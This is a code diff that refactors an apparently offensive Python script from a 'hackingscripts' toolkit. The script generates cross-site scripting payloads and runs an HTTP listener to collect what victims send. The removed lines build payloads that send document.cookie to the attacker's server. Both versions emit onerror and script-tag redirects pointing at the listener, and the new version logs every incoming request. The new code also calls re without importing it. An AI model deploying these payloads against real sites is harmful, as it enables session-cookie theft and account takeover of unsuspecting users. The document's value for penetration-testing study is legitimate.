@@ -1,108 +1,71 @@
 #!/usr/bin/env python
 
 from hackingscripts import util
-import sys
-import http.server
-import socketserver
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from fileserver import HttpFileServer
+import argparse
+import random
 
-# returns http address
-def getServerAddress(address, port):
-    if port == 80:
-        return "http://%s" % address
-    else:
-        return "http://%s:%d" % (address, port)
-
-# returns js code: 'http://xxxx:yy/?x='+document.cookie
-def getCookieAddress(address, port):
-    return "'%s/?x='+document.cookie" % getServerAddress(address, port)
-
-def generatePayload(type, address, port):
-
+def generate_payload(payload_type, url, index=None, **kwargs):
     payloads = []
-    cookieAddress = getCookieAddress(address, port)
 
     media_tags = ["img","audio","video","image","body","script","object"]
-    if type in media_tags:
-        payloads.append('<%s src=1 href=1 onerror="javascript:document.location=%s">' % (type, cookieAddress))
+    if payload_type in media_tags:
+        payloads.append('<%s src=1 href=1 onerror="javascript:document.location=%s">' % (payload_type, url))
 
-    if type == "script":
-        payloads.append('<script type="text/javascript">document.location=%s</script>' % cookieAddress)
-        payloads.append('<script src="%s/xss" />' % getServerAddress(address, port))
+    if payload_type == "script":
+        payloads.append('<script type="text/javascript">document.location=%s</script>' % url)
+        payloads.append('<script src="%s/xss" />' % url)
 
     if len(payloads) == 0:
         return None
 
     return "\n".join(payloads)
 
-class XssServer(BaseHTTPRequestHandler):
-    def _set_headers(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-
-    def _html(self):
-        content = f"<html><body><h1>Got'cha</h1></body></html>"
-        return content.encode("utf8")  # NOTE: must return a bytes object!
-
-    def do_GET(self):
-        self._set_headers()
-        if self.path == "/xss":
-            cookie_addr = getCookieAddress(util.get_address(), listen_port)
-            self.wfile.write(cookie_addr.encode())
-        else:
-            self.wfile.write(self._html())
-
-    def do_HEAD(self):
-        self._set_headers()
-
-    def end_headers(self):
-        self.send_header('Access-Control-Allow-Origin', '*')
-        BaseHTTPRequestHandler.end_headers(self)
-
-    def do_OPTIONS(self):
-        self.send_response(200, "ok")
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        # self.send_header("Access-Control-Allow-Headers", "X-Requested-With")
-        # self.send_header("Access-Control-Allow-Headers", "Content-Type")
-        self.end_headers()
-
-    def do_POST(self):
-        self._set_headers()
-        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
-        post_data = self.rfile.read(content_length)
-        print(post_data)
-        self.wfile.write(self._html())
-
 if __name__ == "__main__":
 
-    if len(sys.argv) < 2:
-        print("Usage: %s <type> [port]" % sys.argv[0])
-        exit(1)
+    parser = argparse.ArgumentParser(description="XSS payload generator")
+    parser.add_argument(dest="type", type=str, default=None, help="Payload type")
+    parser.add_argument("-p", "--port", type=int, required=False, default=None, help="Listening port")
+    parser.add_argument("-a", "--addr", type=str, required=False, default=util.get_address(), help="Listening address")
+    args, extra = parser.parse_known_args()
 
-    listen_port = None if len(sys.argv) < 3 else int(sys.argv[2])
-    payload_type = sys.argv[1].lower()
+    listen_port = args.port
+    payload_type = args.type.lower()
+    local_address = args.addr
+    extra_args = {}
 
-    local_address = util.get_address()
+    for entry in extra:
+        match = re.match(r"(\w+)=(\w+)", entry)
+        if not match:
+            print("Invalid extra argument:", entry)
+            exit()
+        key, value = match.groups()
+        extra_args[key] = value
 
     # choose random port
     if listen_port is None:
-        sock = util.open_server(local_address)
-        if not sock:
-            exit(1)
-        listen_port = sock.getsockname()[1]
-        sock.close()
+        listen_port = random.randint(10000,65535)
+        while util.is_port_in_use(listen_port):
+            listen_port = random.randint(10000,65535)
 
-    payload = generatePayload(payload_type, local_address, listen_port)
-    if not payload:
-        print("Unsupported payload type")
+    http_server = HttpFileServer(local_address, listen_port)
+    payload_type = args.type.lower()
+    url = http_server.get_full_url("/", util.get_address())
+    payload = generate_payload(payload_type, url, **extra_args)
+    if payload is None:
+        print("Unknown payload type: %s" % payload_type)
+        # print("Supported types: ")
         exit(1)
 
-    print("Payload:")
-    print(payload)
-    print()
+    print(f"---PAYLOAD---\n{payload}\n---PAYLOAD---\n")
 
-    httpd = HTTPServer((local_address, listen_port), XssServer)
-    print(f"Starting httpd server on {local_address}:{listen_port}")
-    httpd.serve_forever()
+    headers = {
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "GET, POST, OPTIONS"
+    }
+
+    http_server.addRoute("/", lambda req: (201, b"", headers))
+    http_server.dumpRequest("/")
+    http_server.serve_forever()
+    
+    
